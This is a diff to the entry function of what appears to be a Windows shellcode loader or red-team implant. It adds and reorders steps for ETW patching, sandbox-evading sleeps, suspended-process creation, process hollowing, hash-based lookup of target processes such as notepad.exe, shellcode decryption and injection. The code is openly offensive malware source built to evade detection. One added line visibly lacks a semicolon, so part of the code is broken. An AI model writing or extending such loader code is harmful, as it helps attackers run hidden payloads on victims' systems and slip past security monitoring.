@@ -12,8 +12,6 @@ VOID entry(void)
 	DWORD	pid = 0;
 	HANDLE	process_handle = INVALID_HANDLE_VALUE;
 
-	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));
-
 #pragma region Guard Rails
 
 #pragma endregion
@@ -25,9 +23,9 @@ VOID entry(void)
 #else
 #endif
 
-		//#if ANTI_SANDBOX_ENABLED
-		//#else
-		//#endif
+	//#if ANTI_SANDBOX_ENABLED
+	//#else
+	//#endif
 
 #if PATCH_ENABLED_ETW
 	PatchEtw();
@@ -59,10 +57,15 @@ VOID entry(void)
 	SleepMethod(SLEEP_TIME);
 #endif
 
-#if CONFIG_CREATE_PROCESS == 1
+#if CONFIG_CREATE_PROCESS_METHOD == 1
 	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
 	process_handle = malapi::CreateSuspendedProcess((LPSTR)CONFIG_SACRIFICIAL_PROCESS);
-#elif CONFIG_CREATE_PROCESS == 2
+
+	SleepMethod(SLEEP_TIME);
+
+	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key))
+
+#elif CONFIG_CREATE_PROCESS_METHOD == 2
 	//
 	// ProcessHollowing
 	// AddressOfEntryPoint
@@ -70,7 +73,12 @@ VOID entry(void)
 	//
 	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
 
+	SleepMethod(SLEEP_TIME);
+
+	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
+
 	process_handle = malapi::EntryPointHandle((LPSTR)file_path, shellcode, sizeof(shellcode)); // thread handle
+
 #else
 	constexpr ULONG targets[] = {
 		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
@@ -96,17 +104,12 @@ VOID entry(void)
 	}
 	LOG_SUCCESS("Process ID: %d", pid);
 	process_handle = malapi::GetProcessHandle(pid);
-#endif
 
-#if SLEEP_ENABLED
 	SleepMethod(SLEEP_TIME);
-#endif
-
-#pragma region Decrypt
 
 	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));
 
-#pragma endregion
+#endif
 
 	if (!ExecuteShellcode(process_handle, shellcode, shellcode_size))
 	{
